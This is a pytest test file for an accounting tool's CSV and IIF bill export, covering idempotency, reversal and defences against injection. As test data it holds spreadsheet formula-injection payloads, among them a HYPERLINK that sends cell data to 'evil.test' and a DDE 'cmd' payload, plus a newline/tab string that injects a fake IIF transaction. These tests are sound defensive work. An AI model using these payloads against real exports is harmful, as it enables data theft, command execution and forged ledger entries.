import pathlib
from datetime import date
from pathlib import Path

import pytest

from ledger_sense.domain.money import money
from ledger_sense.writeback.export import ExportAdapter, export_adapter_from_environment
from ledger_sense.writeback.interface import (
    LineItem,
    WritebackPort,
    WriteRequest,
    build_idempotency_key,
)

GOLDENS = pathlib.Path("tests/writeback/goldens")


def _request(application_no: int = 2) -> WriteRequest:
    return WriteRequest(
        idempotency_key=build_idempotency_key("abc123", "C-1", application_no),
        doc_id="doc-1", vendor_ref="Acme Steel Company", vendor_invoice_number=None,
        txn_date=date(2026, 8, 31),
        line_items=[
            LineItem(description="Sitework", amount=money("1000.00"), account_ref="54"),
            LineItem(description="Concrete", amount=money("2500.50"), account_ref="55"),
        ],
        memo="Application 2")


def test_the_export_adapter_satisfies_the_same_protocol(tmp_path: Path) -> None:
    assert isinstance(ExportAdapter(out_dir=str(tmp_path), fmt="csv"), WritebackPort)


def test_csv_output_matches_the_golden(tmp_path: Path) -> None:
    ExportAdapter(out_dir=str(tmp_path), fmt="csv").create_unapproved_bill(_request())
    assert (tmp_path / "bills.csv").read_text(encoding="utf-8") == \
        (GOLDENS / "bills.csv").read_text(encoding="utf-8")


def test_iif_output_matches_the_golden(tmp_path: Path) -> None:
    ExportAdapter(out_dir=str(tmp_path), fmt="iif").create_unapproved_bill(_request())
    assert (tmp_path / "bills.iif").read_text(encoding="utf-8") == \
        (GOLDENS / "bills.iif").read_text(encoding="utf-8")


def test_amounts_are_written_as_decimal_strings_never_floats(tmp_path: Path) -> None:
    ExportAdapter(out_dir=str(tmp_path), fmt="csv").create_unapproved_bill(_request())
    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
    assert "2500.50" in text
    assert "2500.5," not in text and "2500.5\n" not in text


def test_writing_the_same_key_twice_does_not_duplicate_a_row(tmp_path: Path) -> None:
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    adapter.create_unapproved_bill(_request())
    request = _request()
    result = adapter.create_unapproved_bill(request)
    rows = (tmp_path / "bills.csv").read_text(encoding="utf-8").strip().splitlines()
    assert len(rows) == 3          # header + two line items, written once
    assert result.was_replay is True


def test_export_never_reports_a_closed_period(tmp_path: Path) -> None:
    """There is no remote book to close. Say so rather than guessing."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    assert adapter.is_period_closed(date(2020, 1, 1)) is False


def test_reversal_removes_the_exported_rows(tmp_path: Path) -> None:
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    request = _request()
    result = adapter.create_unapproved_bill(request)
    adapter.reverse(result.remote_id, request.idempotency_key)
    rows = (tmp_path / "bills.csv").read_text(encoding="utf-8").strip().splitlines()
    assert len(rows) == 1          # header only


def test_iif_reversal_removes_the_whole_transaction_block(tmp_path: Path) -> None:
    """The IIF `reverse()` branch deletes a whole TRNS/SPL.../ENDTRNS block by
    key — this is a nontrivial rewrite (block deletion, not line deletion) with
    no direct coverage until now. Header rows must survive; every TRNS, SPL and
    ENDTRNS line belonging to the reversed bill must not."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="iif")
    request = _request()
    result = adapter.create_unapproved_bill(request)
    adapter.reverse(result.remote_id, request.idempotency_key)
    lines = (tmp_path / "bills.iif").read_text(encoding="utf-8").splitlines()
    assert lines[0].startswith("!TRNS")
    assert lines[1].startswith("!SPL")
    assert len(lines) == 2          # header only; the block is gone entirely
    assert not any(ln.startswith(("TRNS\t", "SPL\t")) or ln == "ENDTRNS"
                   for ln in lines)


def test_iif_reversal_leaves_a_different_bills_block_untouched(tmp_path: Path) -> None:
    """F-45 for the block-deletion rewrite: reversing one bill's key must not
    touch another bill's TRNS/SPL/ENDTRNS block, byte for byte."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="iif")
    keep = _request(application_no=3)
    adapter.create_unapproved_bill(keep)
    expected_keep_only = (tmp_path / "bills.iif").read_text(encoding="utf-8")

    doomed = _request()
    adapter.create_unapproved_bill(doomed)
    adapter.reverse(doomed.idempotency_key, doomed.idempotency_key)

    after = (tmp_path / "bills.iif").read_text(encoding="utf-8")
    assert after == expected_keep_only
    assert keep.idempotency_key in after
    assert doomed.idempotency_key not in after


def test_reversal_does_not_remove_a_row_that_merely_mentions_the_key(tmp_path: Path) -> None:
    """F-45. `remote_id not in ln` was a substring match over the whole line."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    keep = _request(application_no=3)
    keep.line_items[0].description = f"see {_request().idempotency_key}"
    adapter.create_unapproved_bill(keep)
    doomed = _request()
    adapter.create_unapproved_bill(doomed)
    adapter.reverse(doomed.idempotency_key, doomed.idempotency_key)
    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
    assert keep.idempotency_key in text


# ---- Formula injection: F-27 ----

@pytest.mark.parametrize("payload", [
    '=HYPERLINK("http://evil.test?x="&A1,"click")',
    '+1+1',
    '-2+3',
    '@SUM(1:9)',
    '=cmd|\' /C calc\'!A0',
])
def test_a_formula_in_an_extracted_description_is_neutralised(tmp_path: Path, payload: str) -> None:
    """The description comes out of a client-supplied PDF and lands in a .csv a
    bookkeeper opens in Excel. Anyone who can put an invoice in front of the
    client controls this string."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    request = _request()
    request.line_items[0].description = payload
    adapter.create_unapproved_bill(request)
    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
    assert payload not in text.replace("'" + payload, "")
    assert "'" + payload[0] in text or "'" + payload in text


def test_a_formula_in_an_extracted_vendor_name_is_neutralised(tmp_path: Path) -> None:
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    request = _request()
    request.vendor_ref = "=1+1"
    adapter.create_unapproved_bill(request)
    assert "'=1+1" in (tmp_path / "bills.csv").read_text(encoding="utf-8")


def test_a_tab_in_a_description_cannot_inject_an_extra_iif_transaction(tmp_path: Path) -> None:
    """IIF is tab-delimited and line-oriented. `"\\t".join(...)` with a tab or
    newline inside a field is a STRUCTURAL break — it can add a transaction row
    to a file destined for QuickBooks Desktop."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="iif")
    request = _request()
    request.line_items[0].description = "Sitework\nTRNS\tBILL\t2026-08-31\t54\tAttacker\t9999.00"
    adapter.create_unapproved_bill(request)
    lines = (tmp_path / "bills.iif").read_text(encoding="utf-8").splitlines()
    assert sum(1 for ln in lines if ln.startswith("TRNS\t")) == 1
    assert "Attacker" not in "\t".join(lines).split("\t")[:8]


def test_the_amount_column_is_never_reformatted_by_neutralisation(tmp_path: Path) -> None:
    """A leading apostrophe on a NUMBER would break the import. Only text fields
    are neutralised."""
    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
    adapter.create_unapproved_bill(_request())
    assert ",2500.50," in (tmp_path / "bills.csv").read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# Environment factory
# ---------------------------------------------------------------------------

def test_export_adapter_from_environment_builds_a_real_adapter(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("LEDGER_SENSE_WRITEBACK_DIR", str(tmp_path))
    adapter = export_adapter_from_environment()
    assert isinstance(adapter, ExportAdapter)
    assert adapter.name == "export"


def test_export_adapter_from_environment_raises_when_unset(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("LEDGER_SENSE_WRITEBACK_DIR", raising=False)
    with pytest.raises(RuntimeError, match="LEDGER_SENSE_WRITEBACK_DIR"):
        export_adapter_from_environment()
